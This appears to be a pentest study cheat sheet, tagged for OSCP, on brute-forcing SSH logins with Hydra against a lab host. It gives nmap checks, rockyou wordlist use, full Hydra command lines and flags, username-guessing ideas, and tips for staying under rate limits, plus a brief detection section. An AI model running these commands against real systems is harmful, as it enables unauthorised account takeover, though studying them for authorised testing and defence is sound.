# Attacking SSH with Hydra

## Overview

Hydra is a fast network logon cracker used for:

- brute force attacks
- dictionary attacks
- credential spraying
- password auditing

It supports many protocols including:

- SSH
- FTP
- RDP
- SMB
- HTTP(S)
- Telnet
- VNC
- MySQL
- PostgreSQL

---

## Basic SSH Attack Workflow

```text
Identify SSH service
→ Identify valid usernames
→ Select wordlist
→ Run Hydra attack
→ Validate credentials
```

---

## Verify SSH Service

Always confirm the service first:

```bash
sudo nmap -sV -p 2222 192.168.50.201
```

Example output:

```text
2222/tcp open  ssh OpenSSH 8.2p1 Ubuntu
```

---

## Locate rockyou.txt

Common location:

```bash
/usr/share/wordlists/rockyou.txt.gz
```

Uncompress if needed:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## Basic Hydra SSH Attack

Single username + password list:

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

---

## Common Hydra SSH Syntax

### Single Username

```bash
hydra -l <USER> -P <WORDLIST> ssh://<IP>
```

### Multiple Usernames

```bash
hydra -L users.txt -P passwords.txt ssh://<IP>
```

### Custom Port

```bash
hydra -l admin -P rockyou.txt -s 2222 ssh://192.168.50.201
```

### Verbose Output

```bash
hydra -V -l admin -P rockyou.txt ssh://192.168.50.201
```

### Limit Threads

```bash
hydra -t 4 -l admin -P rockyou.txt ssh://192.168.50.201
```

### Stop After Success

```bash
hydra -f -l admin -P rockyou.txt ssh://192.168.50.201
```

### Restore Interrupted Session

```bash
hydra -R
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password list |
| `-s` | Custom port |
| `-t` | Number of threads |
| `-V` | Verbose output |
| `-f` | Stop after first success |
| `-R` | Restore previous session |
| `-o` | Save output to file |

---

## Example Successful Output

```text
[2222][ssh] host: 192.168.50.201
login: george
password: chocolate
```

---

## Validate Credentials

Always confirm the credentials manually:

```bash
ssh george@192.168.50.201 -p 2222
```

---

## Username Discovery Ideas

If usernames are unknown:

- enumerate SMB
- enumerate LDAP
- inspect email formats
- check LinkedIn/company naming conventions
- review web application users
- test common usernames

Common usernames:

```text
root
admin
administrator
test
guest
dev
backup
service
```

---

## Common Wordlists

| Wordlist | Purpose |
|---|---|
| rockyou.txt | Common passwords |
| seclists | Extensive password collections |
| custom lists | Organisation-specific passwords |

---

## Performance Tips

### Reduce Noise

Limit threads:

```bash
-t 4
```

### Faster Attacks

Increase threads cautiously:

```bash
-t 32
```

### Avoid Lockouts

Slow attacks down:

```bash
-W 3
```

(wait time between retries)

---

## Common Issues

| Issue | Cause |
|---|---|
| Connection refused | Wrong port/service not running |
| Too many connections | IPS/Fail2Ban/rate limiting |
| No valid passwords found | Bad wordlist/usernames |
| Immediate disconnects | Account lockout or filtering |
| Slow attack | Network latency or throttling |

---

## Detection Opportunities

Blue teams may detect:

- repeated failed logins
- many SSH attempts from one IP
- unusual login timing
- brute-force patterns
- failed authentication spikes

Relevant logs:

```text
/var/log/auth.log
/var/log/secure
```

---

## Quick Commands

### Scan SSH

```bash
sudo nmap -sV -p 22,2222 <IP>
```

### Decompress rockyou

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### Basic Attack

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

### Custom Port

```bash
hydra -l george -P rockyou.txt -s 2222 ssh://<IP>
```

### Multiple Users

```bash
hydra -L users.txt -P rockyou.txt ssh://<IP>
```

### Verify Login

```bash
ssh george@<IP> -p 2222
```

#hydra #ssh #password-attacks #bruteforce #dictionary-attack #oscp